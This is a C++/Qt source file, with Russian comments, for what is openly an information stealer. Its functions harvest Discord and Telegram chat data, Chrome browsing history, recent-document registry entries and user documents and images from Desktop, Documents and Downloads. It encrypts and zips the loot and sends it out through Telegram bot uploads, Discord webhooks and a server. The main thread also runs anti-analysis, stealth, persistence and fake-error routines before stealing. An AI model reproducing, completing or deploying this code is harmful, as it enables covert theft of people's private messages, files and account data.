    if (!tokens.empty()) {
        result += tokens;
    }

    // Кража истории чатов
    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for Discord chat history"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string discordPath = appData + "\\discord\\Local Storage\\leveldb\\";
    if (std::filesystem::exists(discordPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file.is_open()) {
                        Log(QString::fromStdString("Failed to open Discord chat file: " + entry.path().string()));
                        continue;
                    }
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();

                    std::regex messageRegex("\"content\":\"[^\"]+\"");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, messageRegex)) {
                        result += "[Discord] Message: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Error in StealDiscordData (chat history): " + std::string(e.what())));
        }
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\discord_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved Discord data to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save Discord data to: " + outputFile));
        }
    }

    return result;
}

// Кража истории чатов
std::string StealChatHistory(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.chatHistory) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for chat history"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    // Проверяем Telegram
    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
    if (std::filesystem::exists(telegramPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                if (entry.path().filename().string().find("chat_") != std::string::npos) {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file.is_open()) {
                        Log(QString::fromStdString("Failed to open Telegram chat file: " + entry.path().string()));
                        continue;
                    }
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    result += "[Telegram] Chat Data (" + entry.path().filename().string() + "):\n" + content + "\n";
                }
            }
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Error in StealChatHistory (Telegram): " + std::string(e.what())));
        }
    }

    // Проверяем Discord (уже покрыто в StealDiscordData, но для полноты добавим логирование)
    Log(QString("Discord chat history is handled in StealDiscordData"));

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\chat_history.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved chat history to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save chat history to: " + outputFile));
        }
    }

    return result;
}

// Кража файлов
std::vector<std::string> StealFiles(const std::string& dir) {
    std::vector<std::string> stolenFiles;
    if (!g_mainWindow || !g_mainWindow->config.stealFiles) return stolenFiles;

    // Определяем пути для поиска файлов
    std::vector<std::string> searchPaths = {
        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Desktop\\",
        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Documents\\",
        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Downloads\\"
    };

    // Расширения файлов, которые нас интересуют
    std::vector<std::string> targetExtensions = {".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".jpg", ".png"};

    for (const auto& path : searchPaths) {
        if (!std::filesystem::exists(path)) {
            Log(QString::fromStdString("Path not found for file stealing: " + path));
            continue;
        }

        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    std::string ext = entry.path().extension().string();
                    if (std::find(targetExtensions.begin(), targetExtensions.end(), ext) != targetExtensions.end()) {
                        // Копируем файл в указанную директорию
                        std::string destPath = dir + "\\stolen_" + std::to_string(GetTickCount()) + "_" + entry.path().filename().string();
                        std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
                        stolenFiles.push_back(destPath);
                        Log(QString::fromStdString("Stole file: " + entry.path().string() + " to " + destPath));
                    }
                }
            }
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Error in StealFiles (" + path + "): " + std::string(e.what())));
        }
    }

    return stolenFiles;
}

// Сбор данных для социальной инженерии
std::string CollectSocialEngineeringData(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.socialEngineering) return result;

    // Собираем данные, которые могут быть полезны для социальной инженерии
    // 1. Системная информация
    std::string sysInfo = GetCustomSystemInfo();
    if (!sysInfo.empty()) {
        result += "[Social Engineering - System Info]\n" + sysInfo + "\n";
    }

    // 2. Недавно открытые файлы (через реестр)
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char valueName[256];
        DWORD valueNameLen = sizeof(valueName);
        DWORD index = 0;
        while (RegEnumValueA(hKey, index++, valueName, &valueNameLen, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            result += "[Social Engineering - Recent File] " + std::string(valueName) + "\n";
            valueNameLen = sizeof(valueName);
        }
        RegCloseKey(hKey);
    } else {
        Log(QString("Failed to access RecentDocs registry for social engineering"));
    }

    // 3. История браузера (на примере Chrome)
    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log(QString("Failed to get LOCALAPPDATA path for social engineering"));
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string chromeHistoryPath = localAppData + "\\Google\\Chrome\\User Data\\Default\\History";
    if (std::filesystem::exists(chromeHistoryPath)) {
        std::string tempHistoryDb = chromeHistoryPath + "_temp";
        std::filesystem::copy_file(chromeHistoryPath, tempHistoryDb, std::filesystem::copy_options::overwrite_existing);

        sqlite3* db = nullptr;
        if (sqlite3_open(tempHistoryDb.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string title = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    result += "[Social Engineering - Chrome History] URL: " + url + " | Title: " + title + "\n";
                }
                sqlite3_finalize(stmt);
            } else {
                Log(QString("Failed to prepare SQLite statement for Chrome history"));
            }
            sqlite3_close(db);
        } else {
            Log(QString("Failed to open Chrome History database for social engineering"));
        }
        std::filesystem::remove(tempHistoryDb);
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\social_engineering_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved social engineering data to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save social engineering data to: " + outputFile));
        }
    }

    return result;
}

// Реализация метода collectSystemInfo с параметром dir
std::string MainWindow::collectSystemInfo(const std::string& dir) {
    if (!config.systemInfo) return "";
    std::string sysInfo = GetCustomSystemInfo();
    if (!sysInfo.empty()) {
        std::string outputFile = dir + "\\system_info.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << sysInfo;
            outFile.close();
            Log(QString::fromStdString("Saved system info to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save system info to: " + outputFile));
        }
        return "[System Info]\n" + sysInfo + "\n";
    }
    return "";
}

// Реализация метода takeScreenshot с параметром dir
std::string MainWindow::takeScreenshot(const std::string& dir) {
    if (!config.screenshot) return "";
    return TakeScreenshot(dir);
}

// Архивация данных
std::string MainWindow::archiveData(const std::string& dir, const std::vector<std::string>& files) {
    if (files.empty()) {
        Log(QString("No files to archive"));
        return "";
    }

    std::string zipFile = dir + "\\archive_" + std::to_string(GetTickCount()) + ".zip";
    if (CreateZipArchive(zipFile, files)) {
        Log(QString::fromStdString("Data archived to: " + zipFile));
        return zipFile;
    } else {
        Log(QString::fromStdString("Failed to archive data to: " + zipFile));
        return "";
    }
}

// Шифрование данных
std::string MainWindow::encryptData(const std::string& data) {
    if (data.empty()) {
        Log(QString("No data to encrypt"));
        return "";
    }

    if (!config.encryptData) {
        Log(QString("Encryption is disabled in config"));
        return data;
    }

    try {
        std::string encrypted = EncryptData(data, config.encryptionKey1, config.encryptionKey2, config.encryptionSalt);
        Log(QString("Data encrypted successfully"));
        return encrypted;
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Failed to encrypt data: " + std::string(e.what())));
        return data;
    }
}

// Дешифрование данных
std::string MainWindow::decryptData(const std::string& encryptedData) {
    if (encryptedData.empty()) {
        Log(QString("No data to decrypt"));
        return "";
    }

    std::string decrypted = DecryptData(encryptedData);
    if (!decrypted.empty()) {
        Log(QString("Data decrypted successfully"));
    } else {
        Log(QString("Failed to decrypt data"));
    }
    return decrypted;
}

// Отправка данных в Telegram
void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::string>& files) {
    if (!config.sendToTelegram || config.telegramBotToken.empty() || config.telegramChatId.empty()) {
        Log(QString("Telegram sending is disabled or bot token/chat ID is missing"));
        return;
    }

    QNetworkAccessManager* manager = new QNetworkAccessManager(this);
    QString url = QString("https://api.telegram.org/bot%1/sendMessage").arg(QString::fromStdString(config.telegramBotToken));
    QNetworkRequest request(QUrl(url));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");

    // Отправка текстовых данных
    if (!data.empty()) {
        QString message = QString("chat_id=%1&text=%2")
            .arg(QString::fromStdString(config.telegramChatId))
            .arg(QString::fromStdString(data).toUtf8().toPercentEncoding());
        QNetworkReply* reply = manager->post(request, message.toUtf8());
        QObject::connect(reply, &QNetworkReply::finished, [reply, manager]() {
            if (reply->error() == QNetworkReply::NoError) {
                Log(QString("Data successfully sent to Telegram"));
            } else {
                Log(QString("Failed to send data to Telegram: ") + reply->errorString());
            }
            reply->deleteLater();
            manager->deleteLater();
        });
    }

    // Отправка файлов
    for (const auto& file : files) {
        if (!std::filesystem::exists(file)) {
            Log(QString::fromStdString("File not found for Telegram upload: " + file));
            continue;
        }

        QNetworkAccessManager* fileManager = new QNetworkAccessManager(this);
        QString fileUrl = QString("https://api.telegram.org/bot%1/sendDocument").arg(QString::fromStdString(config.telegramBotToken));
        QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

        QHttpPart chatIdPart;
        chatIdPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"chat_id\""));
        chatIdPart.setBody(QString::fromStdString(config.telegramChatId).toUtf8());
        multiPart->append(chatIdPart);

        QFile* fileToUpload = new QFile(QString::fromStdString(file));
        if (!fileToUpload->open(QIODevice::ReadOnly)) {
            Log(QString::fromStdString("Failed to open file for Telegram upload: " + file));
            delete fileToUpload;
            delete multiPart;
            fileManager->deleteLater();
            continue;
        }

        QHttpPart filePart;
        filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
                           QVariant("form-data; name=\"document\"; filename=\"" + QString::fromStdString(std::filesystem::path(file).filename().string()) + "\""));
        filePart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("application/octet-stream"));
        filePart.setBodyDevice(fileToUpload);
        fileToUpload->setParent(multiPart);
        multiPart->append(filePart);

        QNetworkRequest fileRequest(QUrl(fileUrl));
        QNetworkReply* fileReply = fileManager->post(fileRequest, multiPart);
        multiPart->setParent(fileReply);

        QObject::connect(fileReply, &QNetworkReply::finished, [fileReply, fileManager, file]() {
            if (fileReply->error() == QNetworkReply::NoError) {
                Log(QString::fromStdString("File successfully sent to Telegram: " + file));
                if (std::filesystem::exists(file)) {
                    std::filesystem::remove(file);
                    Log(QString::fromStdString("Deleted sent file: " + file));
                }
            } else {
                Log(QString("Failed to send file to Telegram: ") + fileReply->errorString());
            }
            fileReply->deleteLater();
            fileManager->deleteLater();
        });
    }
}

// Отправка данных в Discord
void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::string>& files) {
    if (!config.sendToDiscord || config.discordWebhook.empty()) {
        Log(QString("Discord sending is disabled or webhook is missing"));
        return;
    }

    QNetworkAccessManager* manager = new QNetworkAccessManager(this);
    QNetworkRequest request(QUrl(QString::fromStdString(config.discordWebhook)));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "multipart/form-data");

    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    // Отправка текстовых данных
    if (!data.empty()) {
        QHttpPart textPart;
        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"content\""));
        textPart.setBody(QString::fromStdString(data).toUtf8());
        multiPart->append(textPart);
    }

    // Отправка файлов
    int fileIndex = 0;
    for (const auto& file : files) {
        if (!std::filesystem::exists(file)) {
            Log(QString::fromStdString("File not found for Discord upload: " + file));
            continue;
        }

        QFile* fileToUpload = new QFile(QString::fromStdString(file));
        if (!fileToUpload->open(QIODevice::ReadOnly)) {
            Log(QString::fromStdString("Failed to open file for Discord upload: " + file));
            delete fileToUpload;
            continue;
        }

        QHttpPart filePart;
        filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
                           QVariant("form-data; name=\"file" + QString::number(fileIndex) + "\"; filename=\"" + QString::fromStdString(std::filesystem::path(file).filename().string()) + "\""));
        filePart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("application/octet-stream"));
        filePart.setBodyDevice(fileToUpload);
        fileToUpload->setParent(multiPart);
        multiPart->append(filePart);
        fileIndex++;
    }

    QNetworkReply* reply = manager->post(request, multiPart);
    multiPart->setParent(reply);

    QObject::connect(reply, &QNetworkReply::finished, [reply, manager, files]() {
        if (reply->error() == QNetworkReply::NoError) {
            Log(QString("Data successfully sent to Discord"));
            for (const auto& file : files) {
                if (std::filesystem::exists(file)) {
                    std::filesystem::remove(file);
                    Log(QString::fromStdString("Deleted sent file: " + file));
                }
            }
        } else {
            Log(QString("Failed to send data to Discord: ") + reply->errorString());
        }
        reply->deleteLater();
        manager->deleteLater();
    });
}

// Сохранение данных в локальный файл
void MainWindow::saveToLocalFile(const std::string& data, const std::string& dir) {
    if (data.empty()) {
        Log(QString("No data to save locally"));
        return;
    }

    std::string outputFile = dir + "\\local_data_" + std::to_string(GetTickCount()) + ".txt";
    std::ofstream outFile(outputFile);
    if (outFile.is_open()) {
        outFile << data;
        outFile.close();
        Log(QString::fromStdString("Saved data locally to: " + outputFile));
    } else {
        Log(QString::fromStdString("Failed to save data locally to: " + outputFile));
    }
}

// Обновленный метод StealAndSendData с параметром dir
void MainWindow::StealAndSendData(const std::string& tempDir) {
    collectedData.clear();
    filesToSend.clear();

    // Вызываем все методы сбора данных с параметром tempDir
    std::string sysInfo = collectSystemInfo(tempDir);
    if (!sysInfo.empty()) {
        collectedData += sysInfo;
    }

    std::string screenshotPath = takeScreenshot(tempDir);
    if (!screenshotPath.empty()) {
        filesToSend.push_back(screenshotPath);
    }

    std::string browserData = StealBrowserData(tempDir);
    if (!browserData.empty()) {
        collectedData += "[Browser Data]\n" + browserData + "\n";
    }

    std::string discordData = StealDiscordData(tempDir);
    if (!discordData.empty()) {
        collectedData += "[Discord Data]\n" + discordData + "\n";
    }

    std::string telegramData = StealTelegramData(tempDir);
    if (!telegramData.empty()) {
        collectedData += "[Telegram Data]\n" + telegramData + "\n";
    }

    std::string steamData = StealSteamData(tempDir);
    if (!steamData.empty()) {
        collectedData += "[Steam Data]\n" + steamData + "\n";
    }

    std::string epicData = StealEpicData(tempDir);
    if (!epicData.empty()) {
        collectedData += "[Epic Games Data]\n" + epicData + "\n";
    }

    std::string robloxData = StealRobloxData(tempDir);
    if (!robloxData.empty()) {
        collectedData += "[Roblox Data]\n" + robloxData + "\n";
    }

    std::string battleNetData = StealBattleNetData(tempDir);
    if (!battleNetData.empty()) {
        collectedData += "[Battle.net Data]\n" + battleNetData + "\n";
    }

    std::string minecraftData = StealMinecraftData(tempDir);
    if (!minecraftData.empty()) {
        collectedData += "[Minecraft Data]\n" + minecraftData + "\n";
    }

    std::string chatData = StealChatHistory(tempDir);
    if (!chatData.empty()) {
        collectedData += "[Chat History]\n" + chatData + "\n";
    }

    std::vector<std::string> stolenFiles = StealFiles(tempDir);
    filesToSend.insert(filesToSend.end(), stolenFiles.begin(), stolenFiles.end());

    std::string seData = CollectSocialEngineeringData(tempDir);
    if (!seData.empty()) {
        collectedData += "[Social Engineering Data]\n" + seData + "\n";
    }

    // Шифрование данных, если включено
    if (!collectedData.empty()) {
        collectedData = encryptData(collectedData);
    }

    // Сохранение данных в файл
    saveToLocalFile(collectedData, tempDir);
    filesToSend.push_back(tempDir + "\\local_data_" + std::to_string(GetTickCount()) + ".txt");

    // Создание ZIP-архива, если есть файлы
    std::string zipFile;
    if (!filesToSend.empty()) {
        zipFile = archiveData(tempDir, filesToSend);
        if (!zipFile.empty()) {
            filesToSend.clear();
            filesToSend.push_back(zipFile);
        }
    }

    // Отправка данных
    if (config.sendToServer) {
        SendDataToServer(collectedData, filesToSend);
    }
    if (config.sendToTelegram) {
        sendToTelegram(collectedData, filesToSend);
    }
    if (config.sendToDiscord) {
        sendToDiscord(collectedData, filesToSend);
    }
}

// Основной поток выполнения
void WorkerThread(const std::string& tempDir) {
    if (AntiAnalysis()) {
        Log(QString("Anti-analysis triggered, exiting"));
        ExitProcess(1);
    }

    Stealth();
    Persist();
    FakeError();

    if (g_mainWindow) {
        g_mainWindow->StealAndSendData(tempDir);
    }

    Log(QString("Worker thread completed"));
}

// Точка входа
int main(int argc, char* argv[]) {
    // Инициализация GDI+
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    // Инициализация Qt приложения
    QApplication app(argc, argv);
    MainWindow mainWindow;
    g_mainWindow = &mainWindow;

    // Создаем временную директорию
    std::string tempDir = std::filesystem::temp_directory_path().string() + "\\stolen_data_" + std::to_string(GetTickCount());
    std::filesystem::create_directory(tempDir);
    Log(QString::fromStdString("Temporary directory created: " + tempDir));

    // Показываем окно, если не в тихом режиме
    if (!mainWindow.config.silent) {
        mainWindow.show();
    } else {
        Log(QString("Running in silent mode"));
    }

    // Запускаем рабочий поток
    std::thread worker(WorkerThread, tempDir);
    worker.detach();

    // Запускаем цикл обработки событий Qt
    int result = app.exec();

    // Очистка
    std::filesystem::remove_all(tempDir);
    Log(QString::fromStdString("Temporary directory removed: " + tempDir));
    g_mainWindow = nullptr;
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return result;
}